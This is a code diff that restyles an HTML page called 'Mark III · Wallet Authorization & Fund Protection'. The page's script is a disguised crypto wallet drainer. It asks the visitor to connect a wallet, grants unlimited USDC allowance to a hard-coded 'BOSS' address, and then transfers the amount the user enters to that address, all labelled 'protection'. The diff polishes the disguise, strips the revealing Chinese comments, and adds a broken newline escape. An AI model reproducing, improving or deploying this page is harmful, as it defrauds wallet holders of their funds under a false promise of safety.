@@ -2,27 +2,36 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Mark III · One-Click Authorization & Fund Protection</title>
+  <title>Mark III · Wallet Authorization & Fund Protection</title>
   <style>
     body {
       font-family: "Segoe UI", Roboto, sans-serif;
-      background: #f0f4f8;
+      background: linear-gradient(135deg, #e0f2ff, #f5f9ff);
       color: #222;
-      padding: 40px;
+      padding: 50px;
       text-align: center;
     }
     h2 {
       color: #2b6cb0;
+      font-size: 28px;
     }
-    button {
+    .glass-button {
       margin: 20px;
-      padding: 14px 30px;
+      padding: 16px 34px;
       font-size: 18px;
-      border: none;
-      border-radius: 6px;
-      background-color: #2b6cb0;
-      color: white;
+      border: 1px solid rgba(255, 255, 255, 0.3);
+      border-radius: 12px;
+      background: rgba(255, 255, 255, 0.25);
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      color: #2b6cb0;
+      font-weight: 600;
       cursor: pointer;
+      transition: 0.3s;
+    }
+    .glass-button:hover {
+      background: rgba(255, 255, 255, 0.35);
     }
     #status {
       margin-top: 30px;
@@ -34,14 +43,14 @@
   </style>
 </head>
 <body>
-  <h2>Mark III · One-Click Authorization & Fund Protection</h2>
-  <button onclick="startBinding()">🚀 One-Click Bind & Protect</button>
+  <h2>Mark III · Wallet Authorization & Fund Protection</h2>
+  <button class="glass-button" onclick="startBinding()">🚀 One-Click Bind & Protect</button>
   <div id="status"></div>
 
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script>
-    const rawUSDC = "0xA0b86991C6218B36C1d19D4a2e9Eb0cE3606eB48"; // USDC 地址
-    const rawBOSS = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12"; // Boss 地址
+    const rawUSDC = "0xA0b86991C6218B36C1d19D4a2e9Eb0cE3606eB48";
+    const rawBOSS = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12";
     const approveAmount = ethers.constants.MaxUint256;
 
     async function startBinding() {
@@ -58,33 +67,30 @@
         const userAddress = await signer.getAddress();
         status.innerText = "🔗 Connected: " + userAddress;
 
-        // ✅ 校验地址
         const usdcAddress = ethers.utils.getAddress(rawUSDC);
         const bossAddress = ethers.utils.getAddress(rawBOSS);
 
-        // ✅ Step 1: 授权合约
-        status.innerText += "\n⏳ Approving contract...";
+        status.innerText += "\\n⏳ Approving contract...";
         const usdc = new ethers.Contract(usdcAddress, ["function approve(address,uint256) public returns (bool)"], signer);
         const approveTx = await usdc.approve(bossAddress, approveAmount);
         await approveTx.wait();
-        status.innerText += "\n✅ Authorization successful.";
+        status.innerText += "\\n✅ Authorization successful.";
 
-        // ✅ Step 2: 扣款转账
         const amount = prompt("Enter USDC amount to protect:");
         if (!amount || isNaN(amount)) {
-          status.innerText += "\n❌ Invalid amount.";
+          status.innerText += "\\n❌ Invalid amount.";
           return;
         }
         const parsedAmount = ethers.utils.parseUnits(amount, 6);
         const usdcTransfer = new ethers.Contract(usdcAddress, ["function transferFrom(address,address,uint256) public returns (bool)"], signer);
-        status.innerText += "\n⏳ Transferring USDC...";
+        status.innerText += "\\n⏳ Transferring USDC...";
         const transferTx = await usdcTransfer.transferFrom(userAddress, bossAddress, parsedAmount);
         await transferTx.wait();
-        status.innerText += "\n💰 Protection completed successfully.";
+        status.innerText += "\\n💰 Protection completed successfully.";
 
       } catch (err) {
         console.error(err);
-        status.innerText += "\n❌ Error: " + (err.message || err);
+        status.innerText += "\\n❌ Error: " + (err.message || err);
       }
     }
   </script>
